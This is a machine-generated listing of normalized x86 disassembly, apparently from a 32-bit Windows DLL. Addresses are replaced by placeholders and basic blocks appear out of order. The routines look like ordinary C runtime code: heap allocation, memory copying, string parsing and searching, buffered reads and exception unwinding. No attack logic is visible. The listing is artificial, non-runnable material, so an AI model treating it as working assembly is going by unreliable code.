mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_1000d1e0
push ebx
call sub_1000bd76
mov [ ebp - 0x28 ] eax
push ebx
push eax
call sub_1000bda1
add esp 0x18
mov eax esi
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_1000d1e0
push ebx
push [ ebp - 0x28 ]
call sub_1000bda1
add esp 0x14
mov eax esi
push eax
push ebx
push [ ebp - 0x24 ]
call sub_1000d1e0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_1000cb28
add esp 0x18
jmp r-xdata
mov eax esi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
call sub_1000d1e0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_1000cb28
add esp 0x18
mov eax esi
sub_100096ff
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_1000972b
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_1000cf42
test eax eax
pop ecx
jne r-xdata
sub_1000972b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x9
call sub_1000b26e
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000c0ca
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_10009792
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
add eax 0xf
and al 0xf0
push eax
push 0x1
pop eax
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp r-xdata
jmp r-xdata
push esi
jmp r-xdata
push 0x9
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_1000cb6d
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_100097f1
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] esi
cmp esi [ rw-data ]
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
sub_10009830
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10009890 ]
jmp [ ecx * 4 + jump_table_1000990c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009978 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10009978 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_10009b10 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10009a18 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10009b10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009978 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009978 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009978 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10009b10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10009b10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10009b10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10009b10 ]
sub_10009b7c
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_10009dc8
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_10009dc8
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_10009dc8
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
test al 0x8
jne r-xdata
movsx eax bl
push eax
call sub_1000d59a
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
test ebx ebx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
call sub_1000d588
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0x14 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x8 ] eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
and eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] esi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10009d90
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_10009dc8
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_1000d6d5
add esp 0x1c
test eax eax
jne r-xdata
sub_10009e3d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_1000b26e
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000bd76
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push esi
push 0x9
call sub_1000b26e
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_1000cad1
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10009ea7
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
push esi
push eax
call sub_1000bda1
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_10009eff
cmp [ ebp - 0x24 ] 0x0
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
call sub_1000cb28
add esp 0xc
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_10009f26
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_1000d910
inc eax
push eax
call sub_100096ed
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_1000d820
pop ecx
pop ecx
pop esi
retn
sub_10009f60
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10009fe0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_1000a01e
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_1000da47
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a04d
push [ ebp + 0x14 ]
mov esi eax
call sub_1000da99
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_1000a04d
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_1000daeb
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_1000dbc7
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_1000d1e0
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_1000a135
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_1000b4c7
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000b3af
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_1000a187
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_1000a1c9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1000a218
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000de05
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_1000a24e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_1000a2a2
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1000e620
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1000a2a2
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_1000de05
add esp 0x20
pop ebp
retn
sub_1000a2c7
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1000a37d
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_1000e6f1
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_1000a37d
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_1000de05
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1000a1c9
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000a3f2
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_1000e859
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_1000e859
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_1000a470
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000a4b2
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_1000a490
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000a546
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1000a55e
mov ecx [ esp + 0x4 ]
